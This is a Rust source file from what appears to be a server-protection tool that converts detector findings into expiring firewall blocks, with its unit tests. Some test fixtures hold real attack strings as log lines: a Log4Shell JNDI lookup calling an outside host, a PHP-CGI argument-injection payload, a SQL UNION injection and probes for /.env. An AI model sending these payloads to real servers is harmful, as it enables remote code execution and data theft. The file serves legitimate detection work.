fn escalate_subnets(addresses: Vec<String>, min: usize) -> Vec<String> {
    use std::net::{IpAddr, Ipv4Addr};

    let mut by_subnet: HashMap<[u8; 3], Vec<String>> = HashMap::new();
    let mut untouched = Vec::new();
    for address in addresses {
        match address.parse::<IpAddr>() {
            Ok(IpAddr::V4(v4)) => {
                let o = v4.octets();
                by_subnet
                    .entry([o[0], o[1], o[2]])
                    .or_default()
                    .push(address);
            }
            // IPv6 is already widened to its /64, and a bare CIDR or an
            // unparseable string has nothing to escalate.
            _ => untouched.push(address),
        }
    }

    let mut out = untouched;
    for (prefix, members) in by_subnet {
        if members.len() >= min {
            out.push(format!(
                "{}/24",
                Ipv4Addr::new(prefix[0], prefix[1], prefix[2], 0)
            ));
        } else {
            out.extend(members);
        }
    }
    out.sort();
    out
}

/// What a pass needs to write its blocks besides the candidates: the log
/// it read, when it read one whole (the one-off CLI commands), for the
/// line each new block records as evidence (see [`crate::trigger`]); and
/// whether to write at all.
#[derive(Clone, Copy)]
struct Trigger<'a> {
    log_text: Option<&'a str>,
    dry_run: bool,
}

impl<'a> Trigger<'a> {
    fn log(log_text: &'a str, dry_run: bool) -> Self {
        Trigger {
            log_text: Some(log_text),
            dry_run,
        }
    }
}

/// Candidates the detector said nothing more about.
fn unhinted(addresses: Vec<String>) -> Vec<(String, Option<String>)> {
    addresses
        .into_iter()
        .map(|address| (address, None))
        .collect()
}

/// A block's evidence line, from what the detector matched: the log line
/// itself when the whole log is at hand, and otherwise the item the stored
/// evidence kept — the path, the payload's name, the crawler claimed.
fn evidence_line(detector: Detector, item: Option<&str>, line: Option<&String>) -> Option<String> {
    if let Some(line) = line {
        return Some(line.clone());
    }
    let item = item.filter(|item| !item.is_empty());
    Some(match (detector, item) {
        (Detector::SshScanners, _) => {
            "failed SSH logins over the threshold, inside the window".to_string()
        }
        (Detector::WebScanners, Some(path)) => format!("404s for many paths, the first {path}"),
        (Detector::SpoofedCrawlers, Some(name)) => format!(
            "claimed to be {} from an address it does not publish",
            name.trim_end_matches(" IP ranges")
        ),
        (Detector::ProbePaths | Detector::Honeypot | Detector::RobotsTxt, Some(path)) => {
            format!("requested {path}")
        }
        (Detector::Injection, Some(kind)) => format!("sent an exploit payload: {kind}"),
        (Detector::ProtocolProbes, Some(kind)) => format!("sent a request not for a page: {kind}"),
        (Detector::AssetRatio, Some(path)) => format!("pages and no assets, the first {path}"),
        (Detector::RotatingUserAgent, Some(agent)) => {
            format!("many user agents, the first \"{agent}\"")
        }
        (Detector::RefererlessCrawl, Some(path)) => {
            format!("deep pages and never a referer, the first {path}")
        }
        (Detector::LoginAttempts, Some(path)) => {
            format!("login attempts over the threshold, inside the window, the first to {path}")
        }
        (Detector::LoginAttempts, None) => {
            "login attempts over the threshold, inside the window".to_string()
        }
        (Detector::RequestRate, Some(count)) => format!("{count} inside the window"),
        (Detector::RobotsViolators, Some(path)) => {
            format!("fetched robots.txt, then {path}, which it forbids")
        }
        (Detector::PortScanners, Some(ports)) => crate::portscan::evidence_line(ports),
        (_, None) => return None,
    })
}

/// Whether `detector` convicts on a single request, and so leaves alone an
/// address that logged in over SSH any time in
/// [`crate::db::SSH_LOGIN_MEMORY_SECONDS`], not only in the week every
/// detector does. One request for a secret is what an operator checking
/// their own site sends; a detector that counts needs many, which an
/// operator does not, so those keep the week.
fn spares_remembered_logins(detector: Detector) -> bool {
    matches!(
        detector,
        Detector::ProbePaths | Detector::Injection | Detector::ProtocolProbes
    )
}

/// Adds a Block rule, expiring after `ttl_days`, for each of `kept` not
/// already covered by an existing firewall rule of the same exact address.
/// `kept` is each address as the detector saw it, with what it matched
/// where it says; the rule records `detector` as its source and that as
/// its evidence.
/// The existence check reads through [`Db::list_firewall_rules`], which
/// prunes expired rows before returning them — load-bearing here, not just
/// tidiness: without it, a scanner whose earlier block already lapsed
/// would still show up as "already covered" by the stale row and never get
/// re-flagged, and re-running this after a rule expires would otherwise
/// leave the address referenced by two rows (one dead, one freshly
/// inserted) instead of cleanly replacing it.
#[allow(clippy::too_many_arguments)]
fn add_block_rules(
    db: &Db,
    detector: Detector,
    found: usize,
    kept: Vec<(String, Option<String>)>,
    skipped_known_crawlers: usize,
    crawler_exclusion_active: bool,
    ttl_days: i64,
    trigger: Trigger<'_>,
) -> Result<ScanBlockOutcome> {
    // Never a CDN's edge, whichever detector found it: behind the CDN,
    // blocking one blocks every visitor routed through it. Counted with
    // the crawlers, the other published ranges nothing here blocks.
    let (edges, kept): (Vec<_>, Vec<_>) = kept
        .into_iter()
        .partition(|(ip, _)| crate::cdn::is_edge(ip.split('/').next().unwrap_or(ip)));
    let skipped_known_crawlers = skipped_known_crawlers + edges.len();
    // One transaction for the whole pass: a first scan of a busy log can
    // block hundreds of addresses, and each insert (and the evidence it
    // spends) committed on its own was one fsync apiece -- two minutes on
    // a loaded disk for two hundred blocks.
    db.batch(|| {
        add_block_rules_now(
            db,
            detector,
            found,
            kept,
            skipped_known_crawlers,
            crawler_exclusion_active,
            ttl_days,
            trigger,
        )
    })
}

#[allow(clippy::too_many_arguments)]
fn add_block_rules_now(
    db: &Db,
    detector: Detector,
    found: usize,
    kept: Vec<(String, Option<String>)>,
    skipped_known_crawlers: usize,
    crawler_exclusion_active: bool,
    ttl_days: i64,
    trigger: Trigger<'_>,
) -> Result<ScanBlockOutcome> {
    let Trigger { log_text, dry_run } = trigger;
    // Seeded from what's already stored, then *added to as we go*. The
    // second part matters more than it used to: before IPv6 widening, two
    // candidates were only ever equal if the same address appeared twice
    // in the input (already deduped upstream). Now two different addresses
    // can collapse onto one /64, so a pass can produce a duplicate of its
    // own making unless it remembers what it just added.
    let mut existing: HashSet<String> = db
        .list_firewall_rules()?
        .into_iter()
        .map(|rule| rule.address)
        .collect();

    // Addresses the operator has actually logged in from recently, or for a
    // single-request detector at all in the last while. Parsed once, and
    // kept as `IpAddr` rather than strings because the comparison below is
    // containment, not equality.
    let ssh_logins = if spares_remembered_logins(detector) {
        db.remembered_ssh_login_ips()?
    } else {
        db.recent_ssh_login_ips()?
    };
    let ssh_logins: Vec<std::net::IpAddr> =
        ssh_logins.iter().filter_map(|ip| ip.parse().ok()).collect();
    let trusted = db.list_trusted_addresses()?;
    // Addresses an operator unblocked by hand. Matched exactly, since a
    // detector writes the same address for the same client every time,
    // and by overlap for a range, which is what an escalated /24 becomes.
    // See `crate::blocks`.
    let unblocked: HashSet<String> = db
        .unblocked_addresses()?
        .into_iter()
        .map(|(address, _)| address)
        .collect();
    let unblocked_ranges: Vec<&String> = unblocked.iter().filter(|a| a.contains('/')).collect();

    let items: HashMap<String, Option<String>> = kept.iter().cloned().collect();
    let kept: Vec<String> = kept.into_iter().map(|(address, _)| address).collect();
    // The log lines behind the candidates, when the whole log was given.
    let lines = match log_text {
        Some(text) if !dry_run => {
            let observed: Vec<(String, Option<String>)> =
                items.iter().map(|(a, i)| (a.clone(), i.clone())).collect();
            crate::trigger::evidence_for(detector, text, &observed)
        }
        _ => HashMap::new(),
    };
    let flagged = kept.clone();
    let by_block = answered_by(&flagged);
    let kept = match crate::protection::subnet_escalation(db)? {
        Some(min) => escalate_subnets(kept, min),
        None => kept,
    };

    // Clamped here as well as refused at every input, because this is the
    // one place the arithmetic happens and not every caller is an input: a
    // TTL stored before the ceiling existed arrives through `ttl_days(db)`.
    // Shadowed, so the outcome reports the TTL that was actually written.
    // Symmetric rather than from 1: the inputs already refuse anything
    // under a day, and a negative TTL is how the expiry tests make a rule
    // that is born expired. What matters here is only that the product
    // cannot overflow in either direction.
    let max = crate::protection::MAX_TTL_DAYS;
    let ttl_days = ttl_days.clamp(-max, max);
    let escalate = crate::protection::repeat_escalation(db)?;
    let mut newly_blocked = Vec::new();
    let mut repeat_offenders = Vec::new();
    let mut already_covered = 0;
    let mut skipped_ssh_logins = 0;
    let mut skipped_trusted = 0;
    let mut skipped_unblocked = 0;
    for observed in kept {
        // What gets stored is not always what was seen: an IPv6 address is
        // widened to its /64 (see `blockable_address`). Dedup happens on
        // the stored form, so a second address in the same /64 correctly
        // counts as already covered rather than adding a duplicate rule.
        //
        // One wrinkle on upgrade: a /128 row written before this change
        // won't match the /64 now computed for the same address, so both
        // can briefly exist. Harmless — the /128 is inside the /64, and it
        // expires on its own TTL.
        let ip = blockable_address(&observed);
        // Containment rather than string equality, and checked against the
        // *widened* address: an IPv6 candidate is stored as its /64, so an
        // exact-match test would happily write a /64 Block covering the
        // address the operator logs in from.
        if ssh_logins
            .iter()
            .any(|login| crate::ipranges::cidr_contains(&ip, *login))
        {
            skipped_ssh_logins += 1;
            continue;
        }
        // Overlap, not containment one way: a trusted /28 inside the /24
        // an escalation just produced matters as much as a trusted /24
        // around a single scanner.
        if trusted
            .iter()
            .any(|range| crate::ipranges::cidrs_overlap(range, &ip))
        {
            skipped_trusted += 1;
            continue;
        }
        if unblocked.contains(&ip)
            || unblocked_ranges
                .iter()
                .any(|range| crate::ipranges::cidrs_overlap(range, &ip))
        {
            skipped_unblocked += 1;
            continue;
        }
        // The addresses this block answers for: the one observed, or every
        // flagged neighbour an escalated /24 or a /64 stands for.
        let answered: Vec<&String> = match by_block.get(&ip) {
            Some(answered) => answered.clone(),
            None => observed_in(&flagged, &ip),
        };
        if existing.contains(&ip) {
            already_covered += 1;
            // Whatever they did before that block was made, it answered. If
            // it expires, only what they did after it may bring it back.
            if !dry_run {
                if let Some(made) = db.block_created_at(&ip)? {
                    for address in &answered {
                        db.forget_evidence_before(address, made)?;
                    }
                }
            }
            continue;
        }
        // Counted from what is on record, whether or not escalation is
        // on, so that switching it on later has a history to go by. The
        // trusted and recently logged-in addresses above never get here,
        // so they never gain an offence.
        let now = now_secs();
        let offence = db.offences_before(&ip, now)?.saturating_add(1);
        let days = if escalate {
            crate::protection::escalated_ttl_days(ttl_days, offence).clamp(-max, max)
        } else {
            ttl_days
        };
        if days != ttl_days {
            repeat_offenders.push(RepeatOffender {
                address: ip.clone(),
                offence,
                ttl_days: days,
            });
        }
        if !dry_run {
            // The first address it answers for that has something to say.
            let evidence = answered.iter().find_map(|address| {
                let item = items.get(*address).cloned().flatten();
                evidence_line(detector, item.as_deref(), lines.get(*address))
            });
            let ttl_seconds = days * 24 * 60 * 60;
            db.add_firewall_rule_with_ttl(
                &NewFirewallRule {
                    address: ip.clone(),
                    port: None,
                    action: FirewallAction::Block,
                    source: RuleSource::Detector(detector),
                    evidence,
                },
                ttl_seconds,
            )?;
            db.record_offence(&ip, detector, offence, now, now + ttl_seconds)?;
            // The evidence has been acted on. Kept, it would block the
            // address again the minute this block expires, from the same
            // lines -- the bug that made a one-day block last until
            // logrotate. See `Db::forget_evidence_before`.
            let made = now_secs();
            for address in &answered {
                db.forget_evidence_before(address, made)?;
            }
        }
        existing.insert(ip.clone());
        newly_blocked.push(ip);
    }

    Ok(ScanBlockOutcome {
        kind: ScanKind::of(detector),
        candidates: found,
        skipped_known_crawlers,
        crawler_exclusion_active,
        already_covered,
        skipped_ssh_logins,
        skipped_trusted,
        skipped_unblocked,
        newly_blocked,
        repeat_offenders,
        ttl_days,
        dry_run,
    })
}

/// Each block a pass can write, mapped to the `flagged` addresses it
/// answers for: an address itself, the /64 it is widened to, or the /24 it
/// escalates to. Built once per pass. Asking every flagged address about
/// every block made a pass quadratic: 40,000 addresses convicted at once
/// took 76 seconds, all of it here.
fn answered_by(flagged: &[String]) -> HashMap<String, Vec<&String>> {
    use std::net::{IpAddr, Ipv4Addr};

    let mut blocks: HashMap<String, Vec<&String>> = HashMap::new();
    for address in flagged {
        blocks.entry(address.clone()).or_default().push(address);
        let wider = match address.parse::<IpAddr>() {
            Ok(IpAddr::V4(v4)) => {
                let o = v4.octets();
                format!("{}/24", Ipv4Addr::new(o[0], o[1], o[2], 0))
            }
            Ok(IpAddr::V6(_)) => blockable_address(address),
            Err(_) => continue,
        };
        blocks.entry(wider).or_default().push(address);
    }
    blocks
}

/// Which of the `flagged` addresses the block `ip` covers: itself, or
/// every one inside it when it is a /64 or an escalated /24. What
/// [`answered_by`] does not index, for a block of any other shape.
fn observed_in<'a>(flagged: &'a [String], ip: &str) -> Vec<&'a String> {
    flagged
        .iter()
        .filter(|address| {
            address.as_str() == ip
                || address
                    .parse::<std::net::IpAddr>()
                    .is_ok_and(|addr| ipranges::cidr_contains(ip, addr))
        })
        .collect()
}

fn now_secs() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs() as i64
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ssh_failed_attempt(ip: &str, times: usize) -> String {
        format!("Failed password for root from {ip} port 4444 ssh2\n").repeat(times)
    }

    fn not_found_line(ip: &str, path: &str) -> String {
        format!(
            "{ip} - - [10/Jul/2026:12:00:00 +0000] \"GET {path} HTTP/1.1\" 404 1 \"-\" \"UA\"\n"
        )
    }

    #[test]
    fn block_ssh_scanners_adds_a_new_rule() {
        let db = Db::open_in_memory().unwrap();
        let log = ssh_failed_attempt("198.51.100.9", 25);
        let outcome = block_ssh_scanners(&db, 20, 5, &log, false).unwrap();

        assert_eq!(outcome.candidates, 1);
        assert_eq!(outcome.newly_blocked, vec!["198.51.100.9".to_string()]);
        assert_eq!(outcome.already_covered, 0);
        assert_eq!(db.list_firewall_rules().unwrap().len(), 1);
    }

    /// What the internal cron and `batch` run goes through `run_detector`,
    /// which used to pass a hard-coded 20 whatever the operator wanted. It
    /// has to read the stored threshold, in both directions.
    #[test]
    fn the_scheduled_scanner_pass_uses_the_stored_threshold() {
        let db = Db::open_in_memory().unwrap();
        let now = now_secs();
        let at = now - 1_200;
        observe(
            &db,
            Detector::SshScanners,
            "198.51.100.9",
            Item::bucket(at),
            at,
            12,
        );

        let outcome = run_detector(&db, Detector::SshScanners, 5, now, true).unwrap();
        assert_eq!(
            outcome.candidates, 0,
            "12 attempts crossed the default of 20"
        );

        Detector::SshScanners.set_threshold(&db, 10).unwrap();
        let outcome = run_detector(&db, Detector::SshScanners, 5, now, true).unwrap();
        assert_eq!(outcome.candidates, 1, "a threshold of 10 was not applied");
    }

    #[test]
    fn the_scheduled_web_scanner_pass_uses_the_stored_threshold() {
        let db = Db::open_in_memory().unwrap();
        let now = now_secs();
        for i in 0..5 {
            let path = format!("/missing-{i}");
            observe(
                &db,
                Detector::WebScanners,
                "203.0.113.9",
                Item::seen(&path),
                now - 60,
                1,
            );
        }

        let outcome = run_detector(&db, Detector::WebScanners, 1, now, true).unwrap();
        assert_eq!(outcome.candidates, 0, "5 paths crossed the default of 7");

        Detector::WebScanners.set_threshold(&db, 4).unwrap();
        let outcome = run_detector(&db, Detector::WebScanners, 1, now, true).unwrap();
        assert_eq!(outcome.candidates, 1, "a threshold of 4 was not applied");
    }

    /// A TTL stored before the ceiling existed, or passed on the command
    /// line, must not overflow into a block that is born expired — that
    /// is a detector failing open without a word. Debug builds panicked
    /// instead.
    #[test]
    fn a_ttl_too_large_to_represent_still_blocks() {
        let db = Db::open_in_memory().unwrap();
        let log = ssh_failed_attempt("198.51.100.9", 25);
        block_ssh_scanners(&db, 20, i64::MAX, &log, false).unwrap();

        let rules = db.list_firewall_rules().unwrap();
        assert_eq!(rules.len(), 1, "the block was pruned as already expired");
        let expires = rules[0].expires_at.expect("a detector block expires");
        let ceiling = crate::protection::MAX_TTL_DAYS * 24 * 60 * 60;
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs() as i64;
        assert!(
            expires - now <= ceiling,
            "expires {expires}, more than the ceiling from now"
        );
    }

    #[test]
    fn block_ssh_scanners_dry_run_reports_without_writing() {
        let db = Db::open_in_memory().unwrap();
        let log = ssh_failed_attempt("198.51.100.9", 25);
        let outcome = block_ssh_scanners(&db, 20, 5, &log, true).unwrap();

        assert_eq!(outcome.newly_blocked, vec!["198.51.100.9".to_string()]);
        assert!(db.list_firewall_rules().unwrap().is_empty());
    }

    #[test]
    fn block_ssh_scanners_is_idempotent() {
        let db = Db::open_in_memory().unwrap();
        let log = ssh_failed_attempt("198.51.100.9", 25);
        block_ssh_scanners(&db, 20, 5, &log, false).unwrap();
        let second = block_ssh_scanners(&db, 20, 5, &log, false).unwrap();

        assert!(second.newly_blocked.is_empty());
        assert_eq!(second.already_covered, 1);
        assert_eq!(db.list_firewall_rules().unwrap().len(), 1);
    }

    #[test]
    fn block_web_scanners_excludes_known_crawler_ranges() {
        let db = Db::open_in_memory().unwrap();
        ipranges::store(
            &db,
            ipranges::IpRangeSourceKind::GoogleBot,
            &["198.51.100.0/24".to_string()],
        )
        .unwrap();

        let log: String = (0..20)
            .map(|i| not_found_line("198.51.100.9", &format!("/missing-{i}")))
            .collect();
        let outcome = block_web_scanners(&db, 15, 1, &log, false).unwrap();

        assert_eq!(outcome.candidates, 1);
        assert_eq!(outcome.skipped_known_crawlers, 1);
        assert!(outcome.crawler_exclusion_active);
        assert!(outcome.newly_blocked.is_empty());
        assert!(db.list_firewall_rules().unwrap().is_empty());
    }

    /// Anyone can publish a link to `/.env`, and a crawler follows links.
    #[test]
    fn a_request_a_verified_crawler_was_led_to_blocks_nobody() {
        let db = Db::open_in_memory().unwrap();
        ipranges::store(
            &db,
            ipranges::IpRangeSourceKind::GoogleBot,
            &["198.51.100.0/24".to_string()],
        )
        .unwrap();
        let probe = probe_line("198.51.100.9", "/.env");
        let payload = probe_line("198.51.100.9", "/?x=${jndi:ldap://203.0.113.1/a}");
        let trap = probe_line("198.51.100.9", crate::protection::HONEYPOT_PATH_DEFAULT);

        for (detector, outcome) in [
            ("probe paths", block_probe_paths(&db, 5, &probe, false)),
            ("injection", block_injection(&db, 7, &payload, false)),
            ("honeypot", block_honeypot(&db, 30, &trap, false)),
        ] {
            let outcome = outcome.unwrap();
            assert_eq!(
                (outcome.candidates, outcome.skipped_known_crawlers),
                (1, 1),
                "{detector}: {outcome:?}"
            );
        }
        let rules = db.list_firewall_rules().unwrap();
        assert!(rules.is_empty(), "rules were: {rules:?}");
    }

    #[test]
    fn block_web_scanners_still_blocks_outside_known_crawler_ranges() {
        let db = Db::open_in_memory().unwrap();
        ipranges::store(
            &db,
            ipranges::IpRangeSourceKind::GoogleBot,
            &["198.51.100.0/24".to_string()],
        )
        .unwrap();

        let log: String = (0..20)
            .map(|i| not_found_line("203.0.113.9", &format!("/missing-{i}")))
            .collect();
        let outcome = block_web_scanners(&db, 15, 1, &log, false).unwrap();

        assert_eq!(outcome.newly_blocked, vec!["203.0.113.9".to_string()]);
    }

    #[test]
    fn block_web_scanners_reports_inactive_exclusion_when_never_fetched() {
        let db = Db::open_in_memory().unwrap();
        let log: String = (0..20)
            .map(|i| not_found_line("203.0.113.9", &format!("/missing-{i}")))
            .collect();
        let outcome = block_web_scanners(&db, 15, 1, &log, false).unwrap();

        assert!(!outcome.crawler_exclusion_active);
        assert_eq!(outcome.skipped_known_crawlers, 0);
    }

    #[test]
    fn summary_describes_each_outcome_shape() {
        let none = ScanBlockOutcome {
            kind: ScanKind::Scanning,
            candidates: 0,
            skipped_known_crawlers: 0,
            crawler_exclusion_active: true,
            already_covered: 0,
            skipped_ssh_logins: 0,
            skipped_trusted: 0,
            skipped_unblocked: 0,
            newly_blocked: vec![],
            repeat_offenders: vec![],
            ttl_days: 5,
            dry_run: false,
        };
        assert_eq!(none.summary(), "no scanning IPs found");

        let all_covered = ScanBlockOutcome {
            candidates: 2,
            already_covered: 2,
            ..none.clone()
        };
        assert!(all_covered.summary().contains("already covered"));

        let blocked = ScanBlockOutcome {
            candidates: 1,
            newly_blocked: vec!["1.2.3.4".to_string()],
            ..none
        };
        assert_eq!(blocked.summary(), "blocked 1 IP(s)");

        let again = ScanBlockOutcome {
            candidates: 2,
            newly_blocked: vec!["1.2.3.4".to_string(), "1.2.3.5".to_string()],
            repeat_offenders: vec![RepeatOffender {
                address: "1.2.3.5".to_string(),
                offence: 2,
                ttl_days: 10,
            }],
            ..blocked
        };
        assert_eq!(
            again.summary(),
            "blocked 2 IP(s), 1 for longer as repeat offender(s)"
        );
    }

    // ---- spoofed crawler blocking ----

    fn seed_googlebot_ranges(db: &Db) {
        db.register_ip_range_source(&crate::db::IpRangeSource {
            id: "googlebot".to_string(),
            name: "Googlebot IP ranges".to_string(),
            url: "https://example.invalid/googlebot.json".to_string(),
            category: crate::db::Category::Search,
            last_fetched_at: None,
            range_count: 0,
        })
        .unwrap();
        db.replace_ip_ranges("googlebot", &["66.249.64.0/19".to_string()])
            .unwrap();
    }

    fn ua_line(ip: &str, ua: &str) -> String {
        format!("{ip} - - [10/Jul/2026:12:00:00 +0000] \"GET / HTTP/1.1\" 200 512 \"-\" \"{ua}\"\n")
    }

    #[test]
    fn crawler_claims_drops_sources_with_no_fetched_ranges() {
        let db = Db::open_in_memory().unwrap();
        assert!(crawler_claims(&db).unwrap().is_empty());

        seed_googlebot_ranges(&db);
        let claims = crawler_claims(&db).unwrap();
        assert_eq!(claims.len(), 1);
        assert_eq!(claims[0].marker, "googlebot");
        assert!(!claims[0].ranges.is_empty());
    }

    #[test]
    fn block_spoofed_crawlers_blocks_a_forged_googlebot() {
        let db = Db::open_in_memory().unwrap();
        seed_googlebot_ranges(&db);
        let log = ua_line("203.0.113.9", "Googlebot/2.1");

        let outcome = block_spoofed_crawlers(&db, 1, &log, false).unwrap();

        assert_eq!(outcome.kind, ScanKind::SpoofedCrawler);
        assert_eq!(outcome.newly_blocked, vec!["203.0.113.9".to_string()]);
        assert!(outcome.crawler_exclusion_active);
        let rules = db.list_firewall_rules().unwrap();
        assert_eq!(rules.len(), 1);
        assert_eq!(rules[0].address, "203.0.113.9");
        assert_eq!(rules[0].action, FirewallAction::Block);
        assert!(rules[0].expires_at.is_some());
    }

    #[test]
    fn block_spoofed_crawlers_leaves_the_real_googlebot_alone() {
        let db = Db::open_in_memory().unwrap();
        seed_googlebot_ranges(&db);
        let log = ua_line("66.249.66.1", "Googlebot/2.1");

        let outcome = block_spoofed_crawlers(&db, 1, &log, false).unwrap();

        assert_eq!(outcome.candidates, 0);
        assert!(db.list_firewall_rules().unwrap().is_empty());
    }

    /// With nothing fetched the detector must do nothing at all — not
    /// treat every crawler request as forged. `crawler_exclusion_active`
    /// being false is what lets the CLI say "nothing was checked" rather
    /// than "nothing was found".
    #[test]
    fn block_spoofed_crawlers_is_inert_before_any_ranges_are_fetched() {
        let db = Db::open_in_memory().unwrap();
        let log = ua_line("203.0.113.9", "Googlebot/2.1");

        let outcome = block_spoofed_crawlers(&db, 1, &log, false).unwrap();

        assert_eq!(outcome.candidates, 0);
        assert!(!outcome.crawler_exclusion_active);
        assert!(db.list_firewall_rules().unwrap().is_empty());
    }

    #[test]
    fn block_spoofed_crawlers_dry_run_reports_without_writing() {
        let db = Db::open_in_memory().unwrap();
        seed_googlebot_ranges(&db);
        let log = ua_line("203.0.113.9", "Googlebot/2.1");

        let outcome = block_spoofed_crawlers(&db, 1, &log, true).unwrap();

        assert_eq!(outcome.newly_blocked, vec!["203.0.113.9".to_string()]);
        assert!(outcome.dry_run);
        assert!(db.list_firewall_rules().unwrap().is_empty());
    }

    /// A detector must not even *write* a Block for an address the
    /// operator logs in from. `firewall::all_rules` would neutralise it,
    /// but the Firewall screen reads `firewall_rules` directly
    /// and would show the operator's own address as blocked.
    #[test]
    fn block_ssh_scanners_leaves_an_address_with_a_recent_ssh_login_alone() {
        let db = Db::open_in_memory().unwrap();
        db.record_ssh_login_ips(&["198.51.100.9".to_string()])
            .unwrap();
        let log = ssh_failed_attempt("198.51.100.9", 25);

        let outcome = block_ssh_scanners(&db, 20, 1, &log, false).unwrap();

        assert!(outcome.newly_blocked.is_empty());
        assert_eq!(outcome.skipped_ssh_logins, 1);
        assert!(db.list_firewall_rules().unwrap().is_empty());
    }

    /// IPv6 candidates are widened to their /64 before being stored, so an
    /// exact-string check would have written a /64 Block that contains the
    /// very address the operator logs in from.
    #[test]
    fn block_ssh_scanners_leaves_the_whole_64_alone_when_a_login_sits_inside_it() {
        let db = Db::open_in_memory().unwrap();
        db.record_ssh_login_ips(&["2001:db8::5".to_string()])
            .unwrap();
        let log = ssh_failed_attempt("2001:db8::99", 25);

        let outcome = block_ssh_scanners(&db, 20, 1, &log, false).unwrap();

        assert!(outcome.newly_blocked.is_empty());
        assert_eq!(outcome.skipped_ssh_logins, 1);
        assert!(db.list_firewall_rules().unwrap().is_empty());
    }

    /// The same rule for an address trusted by hand, and by overlap: a
    /// trusted /24 covers the scanner inside it, and a trusted address
    /// inside a /64 keeps the whole /64 from being written.
    #[test]
    fn a_detector_never_writes_a_block_that_overlaps_a_trusted_address() {
        for (trusted, scanner) in [
            ("198.51.100.0/24", "198.51.100.9"),
            ("2001:db8::5", "2001:db8::99"),
        ] {
            let db = Db::open_in_memory().unwrap();
            db.trust_address(trusted).unwrap();
            let log = ssh_failed_attempt(scanner, 25);

            let outcome = block_ssh_scanners(&db, 20, 1, &log, false).unwrap();

            assert_eq!(
                outcome.skipped_trusted, 1,
                "{scanner} was not left alone for trusted {trusted}: {outcome:?}"
            );
            assert!(db.list_firewall_rules().unwrap().is_empty());
            assert_eq!(
                outcome.summary(),
                "found 1 scanning IP(s), all trusted — left alone"
            );
        }
    }

    #[test]
    fn block_spoofed_crawlers_skips_an_address_already_covered() {
        let db = Db::open_in_memory().unwrap();
        seed_googlebot_ranges(&db);
        db.add_firewall_rule(&NewFirewallRule {
            address: "203.0.113.9".to_string(),
            port: None,
            action: FirewallAction::Block,
            source: crate::db::RuleSource::Cli,
            evidence: None,
        })
        .unwrap();
        let log = ua_line("203.0.113.9", "Googlebot/2.1");

        let outcome = block_spoofed_crawlers(&db, 1, &log, false).unwrap();

        assert!(outcome.newly_blocked.is_empty());
        assert_eq!(outcome.already_covered, 1);
        assert_eq!(db.list_firewall_rules().unwrap().len(), 1);
    }

    #[test]
    fn summary_uses_the_right_noun_for_each_kind() {
        let base = ScanBlockOutcome {
            kind: ScanKind::Scanning,
            candidates: 0,
            skipped_known_crawlers: 0,
            crawler_exclusion_active: true,
            already_covered: 0,
            skipped_ssh_logins: 0,
            skipped_trusted: 0,
            skipped_unblocked: 0,
            newly_blocked: vec![],
            repeat_offenders: vec![],
            ttl_days: 1,
            dry_run: false,
        };
        assert_eq!(base.summary(), "no scanning IPs found");
        let spoofed = ScanBlockOutcome {
            kind: ScanKind::SpoofedCrawler,
            ..base
        };
        assert_eq!(spoofed.summary(), "no forged crawler IPs found");
    }

    // ---- probe-path blocking ----

    fn probe_line(ip: &str, path: &str) -> String {
        format!(
            "{ip} - - [10/Jul/2026:12:00:00 +0000] \"GET {path} HTTP/1.1\" 404 0 \"-\" \"curl/8\"\n"
        )
    }

    // ---- injection blocking ----

    fn request_line(ip: &str, request: &str, user_agent: &str) -> String {
        format!(
            "{ip} - - [10/Jul/2026:12:00:00 +0000] \"{request}\" 400 0 \"-\" \"{user_agent}\"\n"
        )
    }

    #[test]
    fn block_injection_blocks_a_single_payload() {
        let db = Db::open_in_memory().unwrap();
        let log = request_line(
            "203.0.113.9",
            "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1",
            "Mozilla/5.0",
        );

        let outcome = block_injection(&db, 7, &log, false).unwrap();

        assert_eq!(outcome.kind, ScanKind::Injection);
        assert_eq!(outcome.newly_blocked, vec!["203.0.113.9".to_string()]);
        assert!(db.list_firewall_rules().unwrap()[0].expires_at.is_some());
    }

    #[test]
    fn block_injection_ignores_ordinary_traffic_and_searches() {
        let db = Db::open_in_memory().unwrap();
        let log = [
            request_line("203.0.113.9", "GET /blog/ HTTP/2.0", "Mozilla/5.0"),
            request_line(
                "203.0.113.10",
                "GET /?s=%2Fetc%2Fpasswd HTTP/2.0",
                "Mozilla/5.0",
            ),
        ]
        .concat();

        assert_eq!(block_injection(&db, 7, &log, false).unwrap().candidates, 0);
        assert!(db.list_firewall_rules().unwrap().is_empty());
    }

    /// The payload is in the query, which the path every other detector
    /// reads has already lost — and here the target was logged with its
    /// spaces, so it is not the second word of the request line either.
    #[test]
    fn block_injection_reads_the_query_and_a_target_with_spaces() {
        let db = Db::open_in_memory().unwrap();
        let log = request_line(
            "203.0.113.9",
            "GET /?id=-1 UNION SELECT 1,2,3-- HTTP/1.1",
            "Mozilla/5.0",
        );

        assert_eq!(block_injection(&db, 7, &log, true).unwrap().candidates, 1);
    }

    /// The same exemptions as every other detector: the operator's own
    /// address is never written as a Block, whatever it sent.
    #[test]
    fn block_injection_leaves_an_address_with_a_recent_ssh_login_alone() {
        let db = Db::open_in_memory().unwrap();
        db.record_ssh_login_ips(&["198.51.100.9".to_string()])
            .unwrap();
        let log = request_line(
            "198.51.100.9",
            "GET /?x=${jndi:ldap://a/b} HTTP/1.1",
            "curl/8",
        );

        let outcome = block_injection(&db, 7, &log, false).unwrap();

        assert!(outcome.newly_blocked.is_empty());
        assert_eq!(outcome.skipped_ssh_logins, 1);
        assert!(db.list_firewall_rules().unwrap().is_empty());
    }

    /// An address that logged in over SSH 40 days ago: past the week that
    /// spares it from everything, inside the memory that spares it from a
    /// single request.
    fn logged_in_weeks_ago(ip: &str) -> Db {
        let db = Db::open_in_memory().unwrap();
        db.record_ssh_login_ips(&[ip.to_string()]).unwrap();
        db.backdate_ssh_login_for_tests(ip, 40 * 24 * 60 * 60)
            .unwrap();
        db
    }

    /// What a replay of a real host's logs found: the operator, checking
    /// their own site for a leak six weeks after their last login.
    #[test]
    fn a_single_probe_from_an_address_that_logged_in_weeks_ago_is_left_alone() {
        let db = logged_in_weeks_ago("198.51.100.9");

        let outcome =
            block_probe_paths(&db, 5, &probe_line("198.51.100.9", "/.DS_Store"), false).unwrap();

        assert_eq!(outcome.skipped_ssh_logins, 1, "{outcome:?}");
